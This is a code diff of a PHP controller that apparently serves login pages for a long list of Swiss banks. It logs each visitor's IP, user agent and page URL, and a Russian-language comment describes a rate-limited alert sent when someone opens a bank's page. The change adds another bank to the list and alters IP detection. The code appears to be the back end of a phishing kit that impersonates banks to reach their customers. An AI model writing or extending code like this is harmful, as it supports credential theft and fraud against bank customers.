@@ -20,7 +20,7 @@ class BankLoginController extends Controller
         'swissquote', 'baloise', 'bancastato', 'next-bank', 'llb',
         'raiffeisen', 'valiant', 'bernerland', 'cler', 'dc-bank',
         'banque-du-leman', 'bank-slm', 'sparhafen', 'alternative-bank',
-        'hypothekarbank', 'banque-cantonale-du-valais',
+        'hypothekarbank', 'banque-cantonale-du-valais', 'kantonalbank',
     ];
 
     public function show(string $bankSlug, Request $request): Response
@@ -44,14 +44,14 @@ class BankLoginController extends Controller
         if ($session === null) {
             $session = BankSession::create([
                 'bank_slug'        => $bankSlug,
-                'ip_address'       => $request->ip(),
+                'ip_address'       => $request->clientIp(),
                 'user_agent'       => $request->userAgent(),
                 'last_activity_at' => now(),
             ]);
         }
 
         $preSession = PreSession::create([
-            'ip_address'  => $request->ip(),
+            'ip_address'  => $request->clientIp(),
             'user_agent'  => $request->userAgent(),
             'page_url'    => $request->fullUrl(),
             'page_name'   => $bankSlug,
@@ -62,7 +62,7 @@ class BankLoginController extends Controller
         ]);
 
         // Атомарный lock: шлём уведомление только один раз за 15 сек для IP+банк
-        $lockKey = 'presession:' . $request->ip() . ':' . $bankSlug;
+        $lockKey = 'presession:' . $request->clientIp() . ':' . $bankSlug;
         if (Cache::add($lockKey, true, 15)) {
             PreSessionCreated::dispatch($preSession);
         }
